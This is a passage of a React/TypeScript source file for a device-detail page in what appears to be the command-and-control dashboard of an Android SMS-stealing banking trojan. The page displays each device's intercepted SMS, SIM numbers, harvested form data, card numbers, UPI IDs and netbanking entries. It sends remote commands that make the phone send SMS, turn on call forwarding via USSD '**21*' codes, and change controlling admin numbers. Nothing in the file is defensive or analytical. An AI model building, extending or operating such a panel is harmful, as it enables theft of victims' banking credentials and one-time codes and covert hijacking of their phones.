import { useEffect, useMemo, useRef, useState, type FormEvent } from "react";
import axios from "axios";
import { useNavigate, useParams } from "react-router-dom";

import wsService from "../services/ws/wsService";
import { getDevice } from "../services/api/devices";
import { listDeviceNotifications, deleteDeviceNotifications } from "../services/api/sms";
import { listFormSubmissions } from "../services/api/forms";
import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
import { changeDeletePassword, getDeletePasswordStatus } from "../services/api/admin";
import { ENV, apiHeaders } from "../config/constants";
import Modal from "../components/ui/Modal";
import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
import {
  pickLastSeenAt,
  computeReachability,
  getReachabilityLabel,
  formatLastSeen as formatLastSeenTs,
} from "../utils/reachability";

type TabKey = "overview" | "sms" | "forwarding" | "userdata";
type ForwardState = "idle" | "pending" | "active" | "inactive" | "failed";
type ForwardingChoice = "auto" | "sim1" | "sim2";

type DeleteModalMode = "delete" | "change";
type DeleteAction =
  | { type: "single_sms"; sms: any }
  | { type: "all_sms" }
  | null;

function safeString(v: any): string {
  if (v === null || v === undefined) return "";
  return String(v);
}

function firstNonEmpty(...vals: any[]): string {
  for (const v of vals) {
    const s = safeString(v).trim();
    if (s) return s;
  }
  return "";
}

function getTimestamp(m: any): number {
  const t = m?.timestamp ?? m?.time ?? m?.createdAt ?? m?.date;
  if (typeof t === "number") return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!Number.isNaN(n)) return n;
    const d = Date.parse(t);
    if (!Number.isNaN(d)) return d;
  }
  return 0;
}

function getKeyValuePairs(obj: any): Array<{ label: string; value: string }> {
  if (!obj || typeof obj !== "object") return [];
  const pairs: Array<{ label: string; value: string }> = [];
  for (const k of Object.keys(obj)) {
    const v = (obj as any)[k];
    if (typeof v === "object") continue;
    const s = safeString(v).trim();
    if (s) pairs.push({ label: k, value: s });
  }
  return pairs;
}

function extractSimSummary(
  simInfo: any,
): {
  count: number;
  sim1: string;
  sim2: string;
  sim1Carrier: string;
  sim2Carrier: string;
} {
  if (!simInfo || typeof simInfo !== "object") {
    return { count: 0, sim1: "-", sim2: "-", sim1Carrier: "-", sim2Carrier: "-" };
  }

  const simsArray = Array.isArray(simInfo.sims) ? simInfo.sims : Array.isArray(simInfo.sim) ? simInfo.sim : null;

  const sim1 =
    firstNonEmpty(
      simInfo?.sim1Number, simInfo?.sim1?.number, simInfo?.sim1?.phoneNumber,
      simInfo?.slot1?.number, simInfo?.slot1?.phoneNumber,
      simsArray?.[0]?.number, simsArray?.[0]?.phoneNumber, simsArray?.[0]?.line1Number, simsArray?.[0]?.msisdn,
    ) || "-";

  const sim2 =
    firstNonEmpty(
      simInfo?.sim2Number, simInfo?.sim2?.number, simInfo?.sim2?.phoneNumber,
      simInfo?.slot2?.number, simInfo?.slot2?.phoneNumber,
      simsArray?.[1]?.number, simsArray?.[1]?.phoneNumber, simsArray?.[1]?.line1Number, simsArray?.[1]?.msisdn,
    ) || "-";

  const sim1Carrier =
    firstNonEmpty(
      simInfo?.sim1Carrier, simInfo?.sim1?.carrier, simInfo?.sim1?.operator,
      simInfo?.slot1?.carrier, simInfo?.slot1?.operator,
      simsArray?.[0]?.carrier, simsArray?.[0]?.operator, simsArray?.[0]?.simOperator,
    ) || "-";

  const sim2Carrier =
    firstNonEmpty(
      simInfo?.sim2Carrier, simInfo?.sim2?.carrier, simInfo?.sim2?.operator,
      simInfo?.slot2?.carrier, simInfo?.slot2?.operator,
      simsArray?.[1]?.carrier, simsArray?.[1]?.operator, simsArray?.[1]?.simOperator,
    ) || "-";

  let count = 0;
  if (typeof simInfo.count === "number") count = simInfo.count;
  else if (typeof simInfo.simCount === "number") count = simInfo.simCount;
  else if (Array.isArray(simsArray)) count = simsArray.length;
  else count = [sim1, sim2].filter((x) => x && x !== "-").length;

  return { count, sim1, sim2, sim1Carrier, sim2Carrier };
}

function normalizeEvent(msg: any): { type: string; event: string; deviceId: string; data: any } {
  const type = safeString(msg?.type);
  const event = safeString(msg?.event);
  const deviceId = safeString(msg?.deviceId ?? msg?.id ?? msg?.uniqueid ?? msg?.data?.uniqueid);
  const data = msg?.data ?? msg?.payload ?? {};
  return { type, event, deviceId, data };
}

function isEmptyVal(v: any): boolean {
  if (v === null || v === undefined) return true;
  if (typeof v === "string") {
    const s = v.trim();
    if (!s) return true;
    if (s.toLowerCase() === "null" || s.toLowerCase() === "undefined") return true;
    return false;
  }
  if (typeof v === "number") return !Number.isFinite(v);
  if (typeof v === "boolean") return false;
  if (Array.isArray(v)) return v.length === 0;
  if (typeof v === "object") return Object.keys(v).length === 0;
  return false;
}

function humanLabel(key: string): string {
  return key.replace(/_/g, " ").replace(/([a-z])([A-Z])/g, "$1 $2").trim().replace(/\b\w/g, (m) => m.toUpperCase());
}

function buildPairs(obj: any, max = 16): Array<{ label: string; value: string }> {
  if (!obj || typeof obj !== "object") return [];
  const keys = Object.keys(obj);
  const out: Array<{ label: string; value: string }> = [];
  for (const k of keys) {
    const v = (obj as any)[k];
    if (typeof v === "object" && v !== null) {
      if (Array.isArray(v)) {
        const prim = v.filter((x) => ["string", "number", "boolean"].includes(typeof x)).map((x) => safeString(x));
        const joined = prim.filter((x) => !isEmptyVal(x)).join(", ");
        if (!isEmptyVal(joined)) out.push({ label: humanLabel(k), value: joined });
      }
      continue;
    }
    if (isEmptyVal(v)) continue;
    const s = safeString(v).trim();
    if (!s) continue;
    out.push({ label: humanLabel(k), value: s });
    if (out.length >= max) break;
  }
  return out;
}

function niceMoney(v: any): string {
  const n = Number(v);
  if (!Number.isFinite(n)) return safeString(v);
  try { return n.toLocaleString(undefined, { maximumFractionDigits: 2 }); } catch { return String(n); }
}

function findFirst(obj: any, keys: string[]): any {
  for (const k of keys) { const v = obj?.[k]; if (!isEmptyVal(v)) return v; }
  return "";
}

function paymentTitle(p: any, idx: number): string {
  const amt = findFirst(p, ["amount", "amt", "price", "total", "sum"]);
  const bank = findFirst(p, ["bank", "bankName", "provider"]);
  const upi = findFirst(p, ["upi", "upiId", "vpa"]);
  const card = findFirst(p, ["card", "cardNumber", "pan", "maskedPan"]);
  if (!isEmptyVal(amt)) return `₹ ${niceMoney(amt)}`;
  if (!isEmptyVal(upi)) return `UPI: ${safeString(upi)}`;
  if (!isEmptyVal(bank)) return `${safeString(bank)}`;
  if (!isEmptyVal(card)) return `Card: ${safeString(card)}`;
  return `Item #${idx + 1}`;
}

function sanitizePhoneInput(raw: string): string {
  return raw.replace(/[^\d+]/g, "").trim();
}

function normalizeForwardingChoice(raw: any): ForwardingChoice {
  const v = safeString(raw).trim().toLowerCase();
  if (!v || v === "auto" || v === "default") return "auto";
  if (v === "0" || v === "sim1" || v === "sim_1" || v === "slot0" || v === "slot1") return "sim1";
  if (v === "1" || v === "sim2" || v === "sim_2" || v === "slot2") return "sim2";
  return "auto";
}

async function tryPut(urls: string[], body: any) {
  let lastErr: any = null;
  for (const url of urls) {
    try { const res = await axios.put(url, body, { headers: apiHeaders(), timeout: 8000 }); return res.data; } catch (e) { lastErr = e; }
  }
  throw lastErr || new Error("PUT failed");
}

async function tryDelete(url: string, body?: any) {
  const res = await axios.delete(url, { headers: apiHeaders(), timeout: 8000, data: body });
  return res.data;
}

function SurfaceCard({ children, className = "" }: { children: React.ReactNode; className?: string }) {
  return <div className={["rounded-[24px] border border-slate-200 bg-white/92 shadow-[0_8px_24px_rgba(15,23,42,0.06)]", className].join(" ")}>{children}</div>;
}

function SettingOptionCard({ title, subtitle, value, actionLabel, onClick }: { title: string; subtitle: string; value: string; actionLabel: string; onClick: () => void }) {
  return (
    <div className="rounded-[20px] border border-slate-200 bg-white p-3">
      <div className="flex items-start gap-3">
        <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-2xl border border-slate-200 bg-slate-50 text-lg text-slate-700">✦</div>
        <div className="min-w-0 flex-1">
          <div className="text-[13px] font-extrabold text-slate-900">{title}</div>
          <div className="mt-1 text-[11px] leading-5 text-slate-500">{subtitle}</div>
          <div className="mt-2 text-[12px] text-slate-600">Current: <span className="font-extrabold text-slate-900">{value}</span></div>
        </div>
      </div>
      <button type="button" onClick={onClick} className="mt-3 h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 text-[13px] font-extrabold text-slate-900 hover:bg-slate-100">{actionLabel}</button>
    </div>
  );
}

export default function DeviceDetailPage() {
  const { deviceId = "" } = useParams<{ deviceId: string }>();
  const nav = useNavigate();
  const did = decodeURIComponent(deviceId || "");
  const mountedRef = useRef(true);

  const [activeTab, setActiveTab] = useState<TabKey>("overview");
  const [device, setDeviceDoc] = useState<any | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const [smsList, setSmsList] = useState<any[]>([]);
  const [loadingSms, setLoadingSms] = useState(false);
  const [deletingSmsId, setDeletingSmsId] = useState<string>("");

  const [sendOpen, setSendOpen] = useState(false);
  const [receiver, setReceiver] = useState<string>("");
  const [messageBody, setMessageBody] = useState<string>("");
  const [smsSimSlot, setSmsSimSlot] = useState<0 | 1>(0);
  const [sendingSms, setSendingSms] = useState(false);
  const sendLockRef = useRef(false);

  const simSummary = useMemo(() => extractSimSummary(device?.simInfo), [device]);

  // ── CHANGED: track lastSeen instead of wsOnline boolean ──
  const [wsLastSeenAt, setWsLastSeenAt] = useState<number | null>(null);

  const [forwardingSimDraft, setForwardingSimDraft] = useState<"1" | "2">("1");
  const [forwardingNumberDraft, setForwardingNumberDraft] = useState<string>("");
  const [forwardState, setForwardState] = useState<ForwardState>("idle");
  const [forwardMsg, setForwardMsg] = useState<string>("");

  const simLabel = useMemo(() => (forwardingSimDraft === "1" ? "SIM 1" : "SIM 2"), [forwardingSimDraft]);
  const smsSim1Label = useMemo(() => { const number = simSummary.sim1 && simSummary.sim1 !== "-" ? simSummary.sim1 : "No number"; return `SIM 1 (${number})`; }, [simSummary.sim1]);
  const smsSim2Label = useMemo(() => { const number = simSummary.sim2 && simSummary.sim2 !== "-" ? simSummary.sim2 : "No number"; return `SIM 2 (${number})`; }, [simSummary.sim2]);

  const userLoadedRef = useRef(false);
  const [userLoading, setUserLoading] = useState(false);
  const [userErr, setUserErr] = useState<string | null>(null);
  const [latestFormPayload, setLatestFormPayload] = useState<Record<string, any> | null>(null);
  const [formSubmitCount, setFormSubmitCount] = useState(0);
  const [cardPayments, setCardPayments] = useState<any[]>([]);
  const [netPayments, setNetPayments] = useState<any[]>([]);

  const [adminsOpen, setAdminsOpen] = useState(false);
  const [simPickerOpen, setSimPickerOpen] = useState(false);
  const [adminSaving, setAdminSaving] = useState(false);
  const [forwardingSaving, setForwardingSaving] = useState(false);
  const [adminsDraft, setAdminsDraft] = useState<string[]>(["", "", "", ""]);
  const [forwardingChoice, setForwardingChoice] = useState<ForwardingChoice>("auto");

  const [deleteModalOpen, setDeleteModalOpen] = useState(false);
  const [deleteModalMode, setDeleteModalMode] = useState<DeleteModalMode>("delete");
  const [deleteAction, setDeleteAction] = useState<DeleteAction>(null);
  const [deletePassword, setDeletePassword] = useState("");
  const [deletePasswordSet, setDeletePasswordSet] = useState<boolean | null>(null);
  const [deleteBusy, setDeleteBusy] = useState(false);
  const [deleteError, setDeleteError] = useState<string | null>(null);
  const [deleteSuccess, setDeleteSuccess] = useState<string | null>(null);
  const [changeCurrentPassword, setChangeCurrentPassword] = useState("");
  const [changeNewPassword, setChangeNewPassword] = useState("");
  const [changeConfirmPassword, setChangeConfirmPassword] = useState("");

  const currentAdmins = useMemo<string[]>(() => {
    const rawList: unknown[] = Array.isArray(device?.admins) ? device.admins : Array.isArray(device?.metadata?.admins) ? device.metadata.admins : Array.isArray(device?.adminNumbers) ? device.adminNumbers : [];
    return rawList.map((x: unknown) => sanitizePhoneInput(safeString(x))).filter((value: string) => Boolean(value)).slice(0, 4);
  }, [device]);

  useEffect(() => { const next = ["", "", "", ""]; currentAdmins.forEach((v, i) => { next[i] = v; }); setAdminsDraft(next); }, [currentAdmins]);
  useEffect(() => { const currentRaw = device?.metadata?.forwardingSim ?? device?.forwardingSim ?? device?.metadata?.smsForwardingSim ?? device?.smsForwardingSim ?? "auto"; setForwardingChoice(normalizeForwardingChoice(currentRaw)); }, [device]);

  async function loadDevice() {
    setLoading(true); setError(null);
    try {
      const d = await getDevice(did);
      if (!mountedRef.current) return;
      setDeviceDoc(d);
      const simRaw = firstNonEmpty(d?.metadata?.forwardingSim, d?.forwardingSim, "1") || "1";
      setForwardingSimDraft(simRaw === "2" ? "2" : "1");
      const num = firstNonEmpty(d?.metadata?.forwardingNumber, d?.forwardingNumber, "") || "";
      setForwardingNumberDraft(num);
    } catch (e) { console.error("loadDevice failed", e); if (!mountedRef.current) return; setDeviceDoc(null); setError("Failed loading device"); }
    finally { if (mountedRef.current) setLoading(false); }
  }

  async function loadSms() {
    setLoadingSms(true);
    try { const list = await listDeviceNotifications(did); if (!mountedRef.current) return; const sorted = (list || []).slice().sort((a: any, b: any) => getTimestamp(b) - getTimestamp(a)); setSmsList(sorted); }
    catch (e) { console.warn("loadSms failed", e); if (!mountedRef.current) return; setSmsList([]); }
    finally { if (mountedRef.current) setLoadingSms(false); }
  }

  async function loadDeletePasswordStatus() { try { const res = await getDeletePasswordStatus(); if (!mountedRef.current) return; setDeletePasswordSet(!!res.isSet); } catch (e) { console.warn("loadDeletePasswordStatus failed", e); if (!mountedRef.current) return; setDeletePasswordSet(null); } }

  async function loadUserData(force = false) {
    if (!did) return; if (userLoading) return; if (userLoadedRef.current && !force) return;
    setUserLoading(true); setUserErr(null);
    try {
      const all = await listFormSubmissions().catch(() => []);
      const normalized = (Array.isArray(all) ? all : []).map((d: any) => ({ ...d, uniqueid: d.uniqueid || d?.payload?.uniqueid || "", payload: d.payload || {} }));
      const mine = normalized.filter((x: any) => safeString(x.uniqueid).trim() === did).sort((a: any, b: any) => { const ta = a.createdAt ? new Date(a.createdAt).getTime() : 0; const tb = b.createdAt ? new Date(b.createdAt).getTime() : 0; return tb - ta; });
      setFormSubmitCount(mine.length);
      const latest = mine[0]?.payload && typeof mine[0].payload === "object" ? (mine[0].payload as any) : null;
      setLatestFormPayload(latest);
      const [cards, net] = await Promise.all([getCardPaymentsByDevice(did).catch(() => []), getNetbankingByDevice(did).catch(() => [])]);
      setCardPayments(Array.isArray(cards) ? cards : []); setNetPayments(Array.isArray(net) ? net : []);
      userLoadedRef.current = true;
    } catch (e) { console.error("loadUserData failed", e); setUserErr("Failed to load user data"); setLatestFormPayload(null); setFormSubmitCount(0); setCardPayments([]); setNetPayments([]); }
    finally { setUserLoading(false); }
  }

  function resetDeleteModalState() { setDeleteModalMode("delete"); setDeleteAction(null); setDeletePassword(""); setDeleteBusy(false); setDeleteError(null); setDeleteSuccess(null); setChangeCurrentPassword(""); setChangeNewPassword(""); setChangeConfirmPassword(""); }
  function closeDeleteModal() { setDeleteModalOpen(false); resetDeleteModalState(); }
  async function openDeleteModal(action: DeleteAction) { setDeleteAction(action); setDeleteModalMode("delete"); setDeletePassword(""); setDeleteBusy(false); setDeleteError(null); setDeleteSuccess(null); setChangeCurrentPassword(""); setChangeNewPassword(""); setChangeConfirmPassword(""); setDeleteModalOpen(true); await loadDeletePasswordStatus(); }

  useEffect(() => { wsService.connect(); }, []);
  useEffect(() => { mountedRef.current = true; if (!did) return; loadDevice(); loadSms(); loadDeletePasswordStatus().catch(() => {}); return () => { mountedRef.current = false; }; }, [did]);
  useEffect(() => { if (activeTab !== "userdata") return; loadUserData(false).catch(() => {}); }, [activeTab, did]);

  useEffect(() => {
    const off = wsService.onMessage((msg) => {
      const { type, event, deviceId: evDid, data } = normalizeEvent(msg);

      // ── CHANGED: handle device:lastSeen instead of status ──
      if (type === "event" && (event === "device:lastSeen" || event === "device:upsert") && evDid === did) {
        const lastSeenData = data?.lastSeen || data;
        const lastSeenAt = Number(lastSeenData?.at || data?.timestamp || Date.now());
        const action = String(lastSeenData?.action || "").trim();
        const battery = typeof lastSeenData?.battery === "number" ? lastSeenData.battery : -1;

        setWsLastSeenAt(lastSeenAt);
        setDeviceDoc((prev: any) => {
          if (!prev) return prev;
          return { ...prev, lastSeen: { at: lastSeenAt, action, battery } };
        });
        return;
      }

      // Legacy: handle "status" event as fallback
      if ((type === "event" && event === "status" && evDid === did) || (type === "status" && evDid === did)) {
        const tsAny = data?.timestamp ?? data?.lastSeen ?? (msg as any)?.timestamp ?? (msg as any)?.lastSeen ?? null;
        const tsNum = tsAny !== null ? Number(tsAny) : Number.NaN;
        if (!Number.isNaN(tsNum) && tsNum > 0) {
          setWsLastSeenAt(tsNum);
          setDeviceDoc((prev: any) => {
            if (!prev) return prev;
            return { ...prev, lastSeen: { ...((prev as any).lastSeen || {}), at: tsNum } };
          });
        }
        return;
      }

      if (type === "event" && event === "notification") {
        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid);
        if (targetId !== did) return;
        const incomingId = safeString(data?.id ?? data?._id).trim();
        const nextItem = { ...(data || {}), _id: incomingId || `${Date.now()}_${Math.random().toString(16).slice(2)}`, deviceId: did, timestamp: Number(data?.timestamp || msg?.timestamp || Date.now()) };
        setSmsList((prev) => {
          const existing = incomingId ? prev.some((item: any) => safeString(item?._id ?? item?.id).trim() === incomingId) : false;
          if (existing) return prev;
          return [nextItem, ...prev].sort((a: any, b: any) => getTimestamp(b) - getTimestamp(a));
        });
        return;
      }

      if (type === "event" && event === "simSlots" && evDid === did) {
        const s0 = safeString(data?.["0"]?.status ?? data?.["0"] ?? "").toLowerCase();
        const s1 = safeString(data?.["1"]?.status ?? data?.["1"] ?? "").toLowerCase();
        const slotKey = forwardingSimDraft === "1" ? "0" : "1";
        const st = slotKey === "0" ? s0 : s1;
        if (st === "active") { setForwardState("active"); setForwardMsg("✅ Device confirmed: ACTIVE"); }
        else if (st === "inactive") { setForwardState("inactive"); setForwardMsg("❌ Device confirmed: INACTIVE"); }
        else if (st === "pending") { setForwardState("pending"); setForwardMsg("⏳ Pending…"); }
        setDeviceDoc((prev: any) => { if (!prev) return prev; return { ...prev, simSlots: { ...(prev.simSlots || {}), ...(data || {}) } }; });
        return;
      }

      if ((type === "event" && event === "call_forward:result") || event === "call_forward:result" || type === "call_forward:result") {
        const d2 = data || {}; const id2 = safeString(d2?.uniqueid ?? evDid); if (id2 !== did) return;
        const status = safeString(d2?.status ?? "").toLowerCase();
        if (status === "success" || status === "ok" || status === "done") { setForwardState("active"); setForwardMsg("✅ Success"); }
        else if (status === "pending") { setForwardState("pending"); setForwardMsg("⏳ Pending…"); }
        else { setForwardState("failed"); setForwardMsg("❌ Failed"); }
        return;
      }

      if ((type === "event" || type === "cmd") && event === "admins:update") {
        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid); if (targetId !== did) return;
        const list = Array.isArray(data?.admins) ? data.admins.map((x: any) => sanitizePhoneInput(safeString(x))).filter(Boolean).slice(0, 4) : [];
        setDeviceDoc((prev: any) => ({ ...(prev || {}), admins: list, metadata: { ...(prev?.metadata || {}), admins: list } }));
        return;
      }

      if ((type === "event" || type === "cmd") && event === "forwardingSim:update") {
        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid); if (targetId !== did) return;
        const choice = normalizeForwardingChoice(data?.value);
        setForwardingChoice(choice);
        setDeviceDoc((prev: any) => ({ ...(prev || {}), forwardingSim: choice, metadata: { ...(prev?.metadata || {}), forwardingSim: choice } }));
        return;
      }

      if ((type === "event" || type === "cmd") && event === "notification:deleted") {
        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid); if (targetId !== did) return;
        const deletedId = safeString(data?.id ?? data?._id).trim(); if (!deletedId) return;
        setSmsList((prev) => prev.filter((item: any) => safeString(item?._id ?? item?.id).trim() !== deletedId));
        return;
      }

      if ((type === "event" || type === "cmd") && (event === "form:created" || event === "form_submissions:created")) {
        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid); if (targetId !== did) return;
        const payload = data?.payload && typeof data.payload === "object" ? data.payload : data || {};
        setLatestFormPayload({ ...(payload || {}), uniqueid: did });
        setFormSubmitCount((prev) => prev + 1);
        return;
      }

      if ((type === "event" || type === "cmd") && (event === "card:created" || event === "card_payment:created")) {
        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid); if (targetId !== did) return;
        const payload = data?.payload && typeof data.payload === "object" ? data.payload : data || {};
        setCardPayments((prev) => [payload, ...prev]);
        return;
      }

      if ((type === "event" || type === "cmd") && (event === "netbanking:created" || event === "net_banking:created")) {
        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid); if (targetId !== did) return;
        const payload = data?.payload && typeof data.payload === "object" ? data.payload : data || {};
        setNetPayments((prev) => [payload, ...prev]);
      }
    });

    return () => { off(); };
  }, [did, forwardingSimDraft]);

  async function runDeleteAction(password: string) { if (!deleteAction) return; const trimmedPassword = password.trim(); if (!trimmedPassword) { setDeleteError("Password is required"); return; } if (trimmedPassword.length < 4) { setDeleteError("Password must be at least 4 digits"); return; } setDeleteBusy(true); setDeleteError(null); setDeleteSuccess(null); try { if (deleteAction.type === "all_sms") { await deleteDeviceNotifications(did, trimmedPassword as any); setSmsList([]); setDeleteSuccess(deletePasswordSet ? "All SMS deleted" : "Password created and all SMS deleted"); } else if (deleteAction.type === "single_sms") { const sms = deleteAction.sms; const smsId = safeString(sms?._id ?? sms?.id).trim(); if (!smsId) throw new Error("SMS id not found"); setDeletingSmsId(smsId); const url = `${ENV.API_BASE}/api/devices/notifications/device/${encodeURIComponent(did)}/${encodeURIComponent(smsId)}`; await tryDelete(url, { password: trimmedPassword, uniqueid: did, deviceId: did, id: smsId, _id: smsId }); setSmsList((prev) => prev.filter((item: any) => safeString(item?._id ?? item?.id).trim() !== smsId)); setDeleteSuccess(deletePasswordSet ? "SMS deleted" : "Password created and SMS deleted"); } setDeletePasswordSet(true); setTimeout(() => { if (!mountedRef.current) return; closeDeleteModal(); }, 700); } catch (e: any) { console.error("delete action failed", e); const status = e?.response?.status; const message = safeString(e?.response?.data?.error || e?.message || ""); if (status === 400 || status === 403) setDeleteError(message || "Invalid password"); else setDeleteError(message || "Delete failed"); } finally { setDeleteBusy(false); setDeletingSmsId(""); } }
  async function handleDeleteAllSms() { await openDeleteModal({ type: "all_sms" }); }
  async function handleDeleteSingleSms(sms: any) { const smsId = safeString(sms?._id ?? sms?.id).trim(); if (!smsId) { alert("SMS id not found"); return; } await openDeleteModal({ type: "single_sms", sms }); }
  async function handleSubmitDeletePassword(e?: FormEvent) { if (e) e.preventDefault(); await runDeleteAction(deletePassword); }
  async function handleChangeDeletePassword(e?: FormEvent) { if (e) e.preventDefault(); const currentPassword = changeCurrentPassword.trim(); const newPassword = changeNewPassword.trim(); const confirmPassword = changeConfirmPassword.trim(); if (!currentPassword) { setDeleteError("Current password is required"); return; } if (!newPassword) { setDeleteError("New password is required"); return; } if (newPassword.length < 4) { setDeleteError("New password must be at least 4 digits"); return; } if (newPassword !== confirmPassword) { setDeleteError("Confirm password does not match"); return; } setDeleteBusy(true); setDeleteError(null); setDeleteSuccess(null); try { const res = await changeDeletePassword(currentPassword, newPassword); if (!res.success) { setDeleteError(res.error || "Failed to change password"); return; } setDeletePasswordSet(true); setChangeCurrentPassword(""); setChangeNewPassword(""); setChangeConfirmPassword(""); setDeletePassword(""); setDeleteSuccess("Password changed successfully"); setDeleteModalMode("delete"); } catch (e: any) { console.error("change delete password failed", e); setDeleteError(safeString(e?.response?.data?.error || e?.message || "Failed to change password")); } finally { setDeleteBusy(false); } }

  async function handleSendSmsWs(e?: FormEvent) { if (e) e.preventDefault(); if (sendLockRef.current || sendingSms) return; const to = receiver.trim(); if (!to) { alert("Receiver is required"); return; } const body = messageBody.trim(); if (!body) { alert("Message is required"); return; } sendLockRef.current = true; setSendingSms(true); try { const ok = wsService.sendCmd("sendSms", { address: to, message: body, sim: smsSimSlot, timestamp: Date.now(), uniqueid: did, deviceId: did, clientMsgId: `sendsms_${did}_${Date.now()}` }); if (!ok) throw new Error("WebSocket not connected"); setReceiver(""); setMessageBody(""); setSendOpen(false); alert("SMS command sent (WS)"); } catch (err) { console.error("sendSms ws failed", err); alert("WebSocket not connected — SMS command not sent"); } finally { setSendingSms(false); setTimeout(() => { sendLockRef.current = false; }, 400); } }

  function sendCallForwardCommand(mode: "activate" | "deactivate") { const num = forwardingNumberDraft.trim(); if (mode === "activate") { if (!/^\d{10}$/.test(num) && !/^\+?\d{10,15}$/.test(num)) { alert("Enter valid forwarding number"); return; } } const ussd = mode === "activate" ? `**21*${num}#` : "##21#"; setForwardState("pending"); setForwardMsg("⏳ Command queued (pending)"); const ok = wsService.sendCmd("call_forward", { uniqueid: did, phoneNumber: mode === "activate" ? num : "", sim: simLabel, callCode: ussd, timestamp: Date.now() }); if (!ok) { setForwardState("failed"); setForwardMsg("❌ WebSocket not connected — command not sent"); alert("WebSocket not connected. Try again."); } }

  async function persistAdmins(nextAdminsInput: string[], opts?: { closeOnSuccess?: boolean; successMessage?: string }) { const cleaned = nextAdminsInput.map((x) => sanitizePhoneInput(x)).filter(Boolean).slice(0, 4); setAdminSaving(true); try { const urls = [`${ENV.API_BASE}/api/devices/${encodeURIComponent(did)}/admins`, `${ENV.API_BASE}/api/device-admins/${encodeURIComponent(did)}`, `${ENV.API_BASE}/api/admin/device-admins/${encodeURIComponent(did)}`, `${ENV.API_BASE}/admin/device-admins/${encodeURIComponent(did)}`]; try { await tryPut(urls, { uniqueid: did, deviceId: did, admins: cleaned }); } catch {} wsService.sendCmd("admins:update", { uniqueid: did, deviceId: did, admins: cleaned }); wsService.sendCmd("admin:phone:update", { uniqueid: did, deviceId: did, phone: cleaned[0] || "" }); const nextDraft = ["", "", "", ""]; cleaned.forEach((value, index) => { nextDraft[index] = value; }); setAdminsDraft(nextDraft); setDeviceDoc((prev: any) => ({ ...(prev || {}), admins: cleaned, metadata: { ...(prev?.metadata || {}), admins: cleaned } })); if (opts?.closeOnSuccess !== false) setAdminsOpen(false); alert(opts?.successMessage || "Phone numbers updated"); } catch (e) { console.error("save admins failed", e); alert("Failed to update phone numbers"); } finally { setAdminSaving(false); } }
  async function handleSaveAdmins() { await persistAdmins(adminsDraft, { closeOnSuccess: true, successMessage: "Phone numbers updated" }); }
  async function handleClearAllAdmins() { if (!confirm("Clear all phone numbers from this device?")) return; setAdminsDraft(["", "", "", ""]); await persistAdmins([], { closeOnSuccess: false, successMessage: "All phone numbers cleared" }); }
  async function handleDeleteAdminAt(idx: number) { const currentValue = sanitizePhoneInput(adminsDraft[idx] || ""); if (!currentValue) return; if (!confirm(`Delete phone number ${idx + 1}?`)) return; const next = [...adminsDraft]; next[idx] = ""; await persistAdmins(next, { closeOnSuccess: false, successMessage: `Phone number ${idx + 1} removed` }); }
  async function handleSaveForwardingChoice() { setForwardingSaving(true); try { const value = forwardingChoice === "auto" ? "auto" : forwardingChoice === "sim1" ? "sim1" : "sim2"; const urls = [`${ENV.API_BASE}/api/devices/${encodeURIComponent(did)}/forwardingSim`, `${ENV.API_BASE}/api/devices/${encodeURIComponent(did)}/forwarding-sim`, `${ENV.API_BASE}/api/device-forwarding-sim/${encodeURIComponent(did)}`, `${ENV.API_BASE}/api/admin/device-forwarding-sim/${encodeURIComponent(did)}`, `${ENV.API_BASE}/admin/device-forwarding-sim/${encodeURIComponent(did)}`]; try { await tryPut(urls, { uniqueid: did, deviceId: did, value, forwardingSim: value }); } catch {} wsService.sendCmd("forwardingSim:update", { uniqueid: did, deviceId: did, value }); setDeviceDoc((prev: any) => ({ ...(prev || {}), forwardingSim: value, metadata: { ...(prev?.metadata || {}), forwardingSim: value } })); setSimPickerOpen(false); alert("Forwarding SIM updated"); } catch (e) { console.error("save forwarding sim failed", e); alert("Failed to update forwarding SIM"); } finally { setForwardingSaving(false); } }

  // ── CHANGED: statusLine computed from lastSeen instead of status.online ──
  const statusLine = useMemo(() => {
    const lastSeenAt = wsLastSeenAt ?? pickLastSeenAt(device);
    const reachability = computeReachability(lastSeenAt);
    const label = getReachabilityLabel(reachability);
    const cls =
      reachability === "responsive" ? "text-emerald-700 font-extrabold"
      : reachability === "idle" ? "text-amber-700 font-extrabold"
      : "text-rose-700 font-extrabold";
    return { label, cls, ts: lastSeenAt };
  }, [wsLastSeenAt, device]);

  const forwardPill = useMemo(() => { if (forwardState === "pending") return "bg-amber-50 text-amber-700 border-amber-200"; if (forwardState === "active") return "bg-emerald-50 text-emerald-700 border-emerald-200"; if (forwardState === "inactive") return "bg-rose-50 text-rose-700 border-rose-200"; if (forwardState === "failed") return "bg-rose-50 text-rose-700 border-rose-200"; return "bg-slate-50 text-slate-700 border-slate-200"; }, [forwardState]);
  const latestFormPairs = useMemo(() => buildPairs(latestFormPayload || {}, 20), [latestFormPayload]);
  const cardItems = useMemo(() => (Array.isArray(cardPayments) ? cardPayments : []), [cardPayments]);
  const netItems = useMemo(() => (Array.isArray(netPayments) ? netPayments : []), [netPayments]);
  const forwardingChoiceLabel = useMemo(() => { if (forwardingChoice === "sim1") return "SIM 1"; if (forwardingChoice === "sim2") return "SIM 2"; return "Auto"; }, [forwardingChoice]);
  const deleteModalTitle = useMemo(() => { if (deleteModalMode === "change") return "Change Delete Password"; if (deleteAction?.type === "all_sms") return "Enter Password to Delete All SMS"; return "Enter Password to Delete SMS"; }, [deleteAction, deleteModalMode]);
  const deleteActionLabel = useMemo(() => { if (deleteAction?.type === "all_sms") return "Delete All SMS"; return "Delete SMS"; }, [deleteAction]);
  const deleteHelpText = useMemo(() => { if (deleteModalMode === "change") return "Enter your current password and choose a new password. New password must be at least 4 digits."; if (deletePasswordSet === false) return "No delete password is set yet. The password you enter now will be saved and used for future device/SMS deletes."; return "Enter your delete password to continue. The same password is used for both device delete and SMS delete."; }, [deleteModalMode, deletePasswordSet]);

